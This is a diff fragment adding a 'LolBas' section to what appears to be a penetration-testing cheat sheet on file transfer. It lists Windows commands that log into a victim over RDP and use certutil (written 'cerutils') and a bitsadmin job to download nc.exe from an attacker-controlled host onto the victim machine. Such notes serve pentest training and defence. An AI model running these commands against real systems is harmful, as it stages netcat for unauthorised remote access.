@@ -88,5 +88,15 @@ vim upload.html
 ```
 To upload on a browser at `http://AttackerIpAddress/upload.html`
 
+## LolBas
 
+```
+xfreerdp +clipboard /u:myuser /p:mypass /v:VictimIP
+cerutils -urlcache -split -f http://AttackerApacheIP/nc.exe nc.exe
+bitsadmin /create MyDownload
+bitsadmin /addfile MyDownload http://AttackerIP/nc.exe C:\Users\myuser\Downloads\nc.exe
+bitsadmin /resume MyDownload
+bitsadmin /info MyDownload /verbose
+bitsadmin /complete MyDownload
 
+```
